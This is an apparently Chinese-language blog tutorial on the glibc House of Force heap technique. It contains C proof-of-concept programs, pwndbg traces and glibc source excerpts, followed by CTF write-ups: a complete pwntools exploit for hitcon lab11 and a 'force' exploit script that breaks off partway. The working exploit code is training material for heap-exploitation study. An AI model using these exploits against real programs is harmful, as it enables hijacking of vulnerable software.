<h1 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h1><h2 id="向前控制内存demo1"><a href="#向前控制内存demo1" class="headerlink" title="向前控制内存demo1"></a>向前控制内存demo1</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> *ptr,*ptr2;</span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    ptr=(<span class="type">long</span> *)(((<span class="type">long</span>)ptr)+<span class="number">24</span>);</span><br><span class="line">    *ptr=<span class="number">-1</span>;        <span class="comment">// &lt;=== 这里把top chunk的size域改为0xffffffffffffffff</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">-4120</span>);  <span class="comment">// &lt;=== 减小top chunk指针</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);   <span class="comment">// &lt;=== 分配块实现任意地址写</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc -g -o demo1 demo1.c  ubuntu 16.04</span></span><br></pre></td></tr></table></figure>

<p>在执行过第7行后，top_chunk的size被修改，如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/24gx 0x602000</span><br><span class="line">0x602000:       0x0000000000000000      0x0000000000000021</span><br><span class="line">0x602010:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602020:       0x0000000000000000      0xffffffffffffffff &lt;== top_chunk size = -1</span><br><span class="line">0x602030:       0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>执行过malloc(-4120)，为什么时-4120?</p>
<hr>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; got</span><br><span class="line">Filtering out read-only entries (display them with -r or --show-readonly)</span><br><span class="line"></span><br><span class="line">State of the GOT of /home/ctf/pwn/demo1:</span><br><span class="line">GOT protection: Partial RELRO | Found 2 GOT entries passing the filter</span><br><span class="line">[0x601018] __libc_start_main@GLIBC_2.2.5 -&gt; 0x7ffff7a2d750 (__libc_start_main) ◂— push r14</span><br><span class="line">[0x601020] malloc@GLIBC_2.2.5 -&gt; 0x7ffff7a91180 (malloc) ◂— push rbp</span><br><span class="line">pwndbg&gt; distance 0x602020 0x601010</span><br><span class="line">0x602020-&gt;0x601010 is -0x1010 bytes (-0x202 words)</span><br><span class="line">pwndbg&gt; p  -0x1010</span><br><span class="line"><span class="variable">$1</span> = -4112 </span><br></pre></td></tr></table></figure>

<p> 首先，我们需要明确要写入的目的地址，这里我编译程序后，0x601020 是 <code>malloc@got.plt</code> 的地址。</p>
<p>所以我们应该将 top chunk 指向 0x601010 处，这样当下次再分配 chunk 时，就可以分配到 <code>malloc@got.plt</code> 处的内存了。</p>
<p>之后明确当前 top chunk 的地址，根据前面描述，top chunk 位于 0x602020，所以我们可以计算偏移 -4112</p>
<p>此外，用户申请的内存大小，一旦进入申请内存的函数中就变成了<strong>无符号整数</strong>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *__libc_malloc(<span class="type">size_t</span> bytes) &#123;</span><br></pre></td></tr></table></figure>

<p>如果想要用户输入的大小经过内部的 <code>checked_request2size</code>可以得到这样的大小，即</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Check if a request is so large that it would wrap around zero when</span></span><br><span class="line"><span class="comment">   padded and aligned. To simplify some other code, the bound is made</span></span><br><span class="line"><span class="comment">   low enough so that adding MINSIZE will also not wrap around zero.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REQUEST_OUT_OF_RANGE(req)                                              \</span></span><br><span class="line"><span class="meta">    ((unsigned long) (req) &gt;= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))</span></span><br><span class="line"><span class="comment">/* pad request bytes into a usable size -- internal version */</span></span><br><span class="line"><span class="comment">//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> request2size(req)                                                      \</span></span><br><span class="line"><span class="meta">    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)                           \</span></span><br><span class="line"><span class="meta">         ? MINSIZE                                                             \</span></span><br><span class="line"><span class="meta">         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*  Same, except also perform argument check */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> checked_request2size(req, sz)                                          \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (REQUEST_OUT_OF_RANGE(req)) &#123;                                           \</span></span><br><span class="line"><span class="meta">        __set_errno(ENOMEM);                                                   \</span></span><br><span class="line"><span class="meta">        return 0;                                                              \</span></span><br><span class="line"><span class="meta">    &#125;                                                                          \</span></span><br><span class="line"><span class="meta">    (sz) = request2size(req);</span></span><br></pre></td></tr></table></figure>

<p>一方面，我们需要绕过 REQUEST_OUT_OF_RANGE(req) 这个检测，即我们传给 malloc 的值在负数范围内，不得大于 -2 * MINSIZE，这个一般情况下都是可以满足的。</p>
<p>另一方面，在满足对应的约束后，我们需要使得 <code>request2size</code>正好转换为对应的大小，也就是说，我们需要使得 ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK 恰好为 - 4112。首先，很显然，-4112 是 chunk 对齐的，那么我们只需要将其分别减去 SIZE_SZ，MALLOC_ALIGN_MASK 就可以得到对应的需要申请的值。其实我们这里只需要减 SIZE_SZ 就可以了，因为多减的 MALLOC_ALIGN_MASK 最后还会被对齐掉。而<strong>如果 -4112 不是 MALLOC_ALIGN 的时候，我们就需要多减一些了。当然，我们最好使得分配之后得到的 chunk 也是对齐的，因为在释放一个 chunk 的时候，会进行对齐检查。</strong></p>
<p>因此，我们当调用<code>malloc(-4120)</code>之后，我们可以观察到 top chunk 被抬高到我们想要的位置</p>
<hr>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p main_arena</span><br><span class="line"><span class="variable">$2</span> = &#123;</span><br><span class="line">  mutex = 0,</span><br><span class="line">  flags = 1,</span><br><span class="line">  fastbinsY = &#123;0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0&#125;,</span><br><span class="line">  top = 0x601010,</span><br><span class="line">  last_remainder = 0x0,</span><br><span class="line">......</span><br><span class="line">pwndbg&gt; top_chunk</span><br><span class="line">PREV_INUSE</span><br><span class="line">Addr: 0x601010</span><br><span class="line">Size: 0x1009</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/24gx 0x601010</span><br><span class="line">0x601010:       0x00007ffff7deef10      0x0000000000001009 &lt;== top_chunk</span><br><span class="line">0x601020 &lt;malloc@got.plt&gt;:      0x00007ffff7a91180      0x0000000000000000</span><br><span class="line">0x601030:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x601040:       0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这个0x1009 可以按源码算出来： (-1) - ((-4120) + 0x10) &#x3D; 0x1009</p>
<p>remainder_size &#x3D; size - nb; size &#x3D; -1; nb &#x3D; (unsigned long)(requst_size) + (pre_size + size); 其中-1和-4120被转化为unsigned long</p>
</blockquote>
<p>之后，我们分配的块就会出现在 0x601010+0x10 的位置，也就是 0x601020 可以更改 got 表中的内容了。</p>
<p>但是需要注意的是，在被抬高的同时，malloc@got 附近的内容也会被修改。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">set_head(victim, nb | PREV_INUSE |</span><br><span class="line">        (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br></pre></td></tr></table></figure>

<p>执行过malloc(0x10)，如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/24gx 0x601000</span><br><span class="line">0x601000:       0x0000000000600e28      0x00007ffff7ffe168</span><br><span class="line">0x601010:       0x00007ffff7deef10      0x0000000000000021 &lt;== malloc(0x10)得到的</span><br><span class="line">0x601020 &lt;malloc@got.plt&gt;:      0x00007ffff7a91180      0x0000000000000000</span><br><span class="line">0x601030:       0x0000000000000000      0x0000000000000fe9 &lt;== top_chunk</span><br><span class="line">0x601040:       0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>

<h2 id="向后控制内存demo2"><a href="#向后控制内存demo2" class="headerlink" title="向后控制内存demo2"></a>向后控制内存demo2</h2><p>在上一个示例中，我们演示了如何修改 <code>top_chunk</code> 使得 <code>top_chunk</code> 指针减小来修改其上面（低地址）的 <code>got</code> 表中的内容。同样，利用这种方式可以修改其下面（高地址）的内容。这次同样的利用代码进行演示：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> *ptr,*ptr2;</span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    ptr=(<span class="type">long</span> *)(((<span class="type">long</span>)ptr)+<span class="number">24</span>);</span><br><span class="line">    *ptr=<span class="number">-1</span>;                 <span class="comment">//&lt;=== 修改top chunk size</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">140737345551056</span>); <span class="comment">//&lt;=== 增大top chunk指针</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以看到程序代码与简单示例 1 基本相同，除了第二次 malloc 的 size 有所不同。 这次我们的目标是 malloc_hook，我们知道 malloc_hook 是位于 libc.so 里的全局变量值，首先查看内存布局：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">             Start                End Perm     Size Offset File</span><br><span class="line">          0x400000           0x401000 r-xp     1000      0 /home/ctf/pwn/demo2</span><br><span class="line">          0x600000           0x601000 r--p     1000      0 /home/ctf/pwn/demo2</span><br><span class="line">          0x601000           0x602000 rw-p     1000   1000 /home/ctf/pwn/demo2</span><br><span class="line">          0x602000           0x623000 rw-p    21000      0 [heap]</span><br><span class="line">    0x7ffff7a0d000     0x7ffff7bcd000 r-xp   1c0000      0 /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">    0x7ffff7bcd000     0x7ffff7dcd000 ---p   200000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">    0x7ffff7dcd000     0x7ffff7dd1000 r--p     4000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">    0x7ffff7dd1000     0x7ffff7dd3000 rw-p     2000 1c4000 /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">    0x7ffff7dd3000     0x7ffff7dd7000 rw-p     4000      0 [anon_7ffff7dd3]</span><br><span class="line">    0x7ffff7dd7000     0x7ffff7dfd000 r-xp    26000      0 /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">    0x7ffff7fec000     0x7ffff7fef000 rw-p     3000      0 [anon_7ffff7fec]</span><br><span class="line">    0x7ffff7ff6000     0x7ffff7ffa000 r--p     4000      0 [vvar]</span><br><span class="line">    0x7ffff7ffa000     0x7ffff7ffc000 r-xp     2000      0 [vdso]</span><br><span class="line">    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000  25000 /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000  26000 /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000      0 [anon_7ffff7ffe]</span><br><span class="line">    0x7ffffffde000     0x7ffffffff000 rw-p    21000      0 [stack]</span><br></pre></td></tr></table></figure>

<p>可以看到 heap 的基址在 0x602000，而 libc 的基址在 0x7ffff7a0d000，因此我们需要通过 HOF 扩大 top chunk 指针的值来实现对 malloc_hook 的写。 首先，由调试得知 __malloc_hook 的地址位于 0x7ffff7dd1b10 ，采取计算</p>
<p><code>0x7ffff7dd1b00-0x602020-0x10=140737345551056 </code>经过这次 malloc 之后，我们可以观察到 top chunk 的地址被抬高到了 0x00007ffff7dd1b00</p>
<p>执行过malloc(140737345551056);</p>
<p>通过 <code>p main_arena</code>或<code>top_chunk</code>等来查看top_chunk的位置，如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; top_chunk</span><br><span class="line">PREV_INUSE</span><br><span class="line">Addr: 0x7ffff7dd1b10</span><br><span class="line">Size: 0xffff800008830509</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/24gx 0x7ffff7dd1b10</span><br><span class="line">0x7ffff7dd1b10 &lt;__malloc_hook&gt;: 0x0000000000000000      0xffff800008830509</span><br><span class="line">0x7ffff7dd1b20 &lt;main_arena&gt;:    0x0000000100000000      0x0000000000000000</span><br><span class="line">0x7ffff7dd1b30 &lt;main_arena+16&gt;: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>之后，我们只要再次分配就可以控制 0x7ffff7dd1b10 处的 __malloc_hook 值了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rax = 0x00007ffff7dd1b10</span><br><span class="line"></span><br><span class="line">0x400562 &lt;main+60&gt;        mov    edi, 0x10</span><br><span class="line">0x400567 &lt;main+65&gt;        call   0x400410 &lt;malloc@plt&gt;</span><br></pre></td></tr></table></figure>

<h2 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h2><p>在这一节中讲解了 House Of Force 的原理并且给出了两个利用的简单示例，通过观察这两个简单示例我们会发现其实 HOF 的利用要求还是相当苛刻的。</p>
<ul>
<li>首先，需要存在漏洞使得用户能够控制 top chunk 的 size 域。</li>
<li>其次，<strong>需要用户能自由控制 malloc 的分配大小</strong></li>
<li>第三，分配的次数不能受限制</li>
</ul>
<p>其实这三点中第二点往往是最难办的，CTF 题目中往往会给用户分配堆块的大小限制最小和最大值使得不能通过 HOF 的方法进行利用。</p>
<p>公式为： <code>malloc(size)</code> 中的 <code>size=new_top_chunk_addr-old_top_chunk_addr-0x10</code>  </p>
<ul>
<li><code>new_top_chunk_addr</code> 为要转移 <code>top_chunk</code> 的目标地址。  </li>
<li><code>old_top_chunk_addr</code> 为已经被篡改的 <code>top_chunk</code> 地址。</li>
<li>new_top_chunk_addr &#x3D; target_addr - 0x10</li>
</ul>
<h1 id="top-chunk-attack的利用"><a href="#top-chunk-attack的利用" class="headerlink" title="top chunk attack的利用"></a>top chunk attack的利用</h1><h2 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house of force"></a>house of force</h2><p>利用溢出等漏洞，将top chunk的size修改为-1，转换为无符号数就是最大值，然后通过malloc(offset)，即可将top chunk转移到目标地址，比如malloc_hook等，然后，再次malloc，就可控制目标地址处的数据（此图中的addr1已是old_top_chunk_addr - 0x10）。</p>
<p><img data-src="/../images/image-20250409132924240.png" alt="image-20250409132924240"></p>
<p>不仅可以malloc正数，还可以malloc(负数)使得top chunk上移到程序里的got表等。</p>
<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> buf[<span class="number">0x100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="type">char</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">   <span class="type">char</span> *top_chunk_addr = p1 + <span class="number">0x10</span>;</span><br><span class="line">   *(<span class="type">size_t</span> *)(top_chunk_addr + <span class="number">0x8</span>) = <span class="number">-1</span>; <span class="comment">//修改top chunk的size</span></span><br><span class="line">   <span class="type">size_t</span> offset = buf - p1 - <span class="number">0x30</span>;<span class="comment">//(buf-0x10) - (p1+0x10) - 0x10</span></span><br><span class="line">   <span class="built_in">malloc</span>(offset);</span><br><span class="line">    </span><br><span class="line">   <span class="type">char</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x50</span>);</span><br><span class="line">   <span class="built_in">strcpy</span>(p2,<span class="string">&quot;hello,welcome to pwn\n&quot;</span>);</span><br><span class="line">   write(<span class="number">1</span>,buf,<span class="built_in">strlen</span>(buf));</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="无free得到unsortedbin"><a href="#无free得到unsortedbin" class="headerlink" title="无free得到unsortedbin"></a>无free得到unsortedbin</h2><p>前面，我们分析到，如果想要的size大于top chunk的size，并且size在mmap阈值之下，那么就会申请新的top chunk，将旧的top chunk给free掉，我们可以利用这个free来得到unsorted bin。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Record incoming configuration of top */</span></span><br><span class="line"></span><br><span class="line">old_top = av-&gt;top;</span><br><span class="line">old_size = chunksize (old_top);</span><br><span class="line">old_end = (<span class="type">char</span> *) (chunk_at_offset (old_top, old_size));<span class="comment">//*</span></span><br><span class="line"></span><br><span class="line">brk = snd_brk = (<span class="type">char</span> *) (MORECORE_FAILURE);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If not the first time through, we require old_size to be</span></span><br><span class="line"><span class="comment">   at least MINSIZE and to have prev_inuse set.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">        ((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">         prev_inuse (old_top) &amp;&amp;</span><br><span class="line">         ((<span class="type">unsigned</span> <span class="type">long</span>) old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));<span class="comment">//*页检查</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Precondition: not enough current space to satisfy nb request */</span></span><br><span class="line">assert ((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE));</span><br></pre></td></tr></table></figure>

<p>Top chunk的size不是随便改变某个值，想要验证检查，其中这里是页对齐检查，也就是说top_chunk_addr + size的值低12bit为0。</p>
<p>系统分配时的top chunk一般是页对齐的，一般情况下在改size时只需要将高位置零，低位不变即可。</p>
<h3 id="poc-1"><a href="#poc-1" class="headerlink" title="poc"></a>poc</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> buf[<span class="number">0x100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="type">char</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">   <span class="type">char</span> *top_chunk_addr = p1 + <span class="number">0x10</span>;</span><br><span class="line">   *(<span class="type">size_t</span> *)(top_chunk_addr + <span class="number">0x8</span>) = <span class="number">0xFE1</span>; <span class="comment">//修改top chunk的size，注意页对齐</span></span><br><span class="line">   <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">   read(<span class="number">0</span>,buf,<span class="number">0x100</span>);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="/../images/image-20250409152243476.png" alt="image-20250409152243476"></p>
<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="hitcon-lab11"><a href="#hitcon-lab11" class="headerlink" title="hitcon lab11"></a>hitcon lab11</h2><p>越看越熟悉，这不是我学习unlink时的例题吗 ^_^</p>
<p>house_of_force思路：</p>
<ol>
<li>溢出改top_chunk为 -1</li>
<li>house_of_force 将 top_chunk 迁移至hello_message()和goodbye_messgae()所在的结构体</li>
<li>将这goodbye_message()函数改为magic()函数，即可拿flag</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># time: 2025-04-09 18:32:41</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;G&#x27;</span>]:</span><br><span class="line">    p = remote(<span class="string">&#x27;&#x27;</span>, )</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(file_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;libc-2.23.so&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :p.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\\x00&#x27;</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name, addr         :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">length,name</span>):</span><br><span class="line">    ru(<span class="string">b&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;Please enter the length of item name:&#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(length))</span><br><span class="line">    ru(<span class="string">b&#x27;Please enter the name of item:&#x27;</span>)</span><br><span class="line">    sl(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    ru(<span class="string">b&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,length,name</span>):</span><br><span class="line">    ru(<span class="string">b&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(idx))</span><br><span class="line">    ru(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(length))</span><br><span class="line">    ru(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    sl(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    ru(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x400d49</span></span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x48</span> + p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">add(-<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,p64(magic)*<span class="number">2</span>)</span><br><span class="line">ru(<span class="string">b&#x27;Your choice:&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<p>ubuntu16.04，glibc2.23</p>
<p>结果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    b<span class="string">&#x27;5\n&#x27;</span></span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">invaild choice!!!</span><br><span class="line">----------------------------</span><br><span class="line">Bamboobox Menu</span><br><span class="line">----------------------------</span><br><span class="line">1.show the items <span class="keyword">in</span> the box</span><br><span class="line">2.add a new item</span><br><span class="line">3.change the item <span class="keyword">in</span> the box</span><br><span class="line">4.remove the item <span class="keyword">in</span> the box</span><br><span class="line">5.<span class="built_in">exit</span></span><br><span class="line">----------------------------</span><br><span class="line">Your choice:[*] Process <span class="string">&#x27;./pwn&#x27;</span> stopped with <span class="built_in">exit</span> code 0 (pid 1162)</span><br><span class="line">[DEBUG] Received 0x15 bytes:</span><br><span class="line">    b<span class="string">&#x27;flah&#123;house_of_force&#125;\n&#x27;</span></span><br><span class="line">flah&#123;house_of_force&#125;</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$    </span><br></pre></td></tr></table></figure>

<h2 id="force"><a href="#force" class="headerlink" title="force"></a>force</h2><p><a href="https://github.com/le0n-daily/profile/blob/main/pwn/force">i春秋新春战疫之force</a></p>
<p>漏洞点：</p>
<p><img data-src="/../images/image-20250410184421781.png" alt="image-20250410184421781"></p>
<ul>
<li>只有add()函数有用</li>
<li>malloc(input)，这个input无检查，可负可非常大</li>
<li>read()中有溢出，可在add()时就溢出</li>
</ul>
<p>思路(house_of_force)：</p>
<ol>
<li>利用mmap的阈值分配机制得到libc_base</li>
<li>house_of_force 改 top_chunk 大小 -1，分配到堆块可以改 realloc_hook 和 malloc_hook</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># time: 2025-04-09 18:32:41</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./force&#x27;</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;G&#x27;</span>]:</span><br><span class="line">    p = remote(<span class="string">&#x27;&#x27;</span>, )</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(file_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;libc-2.23.so&#x27;)</span></span><br><span 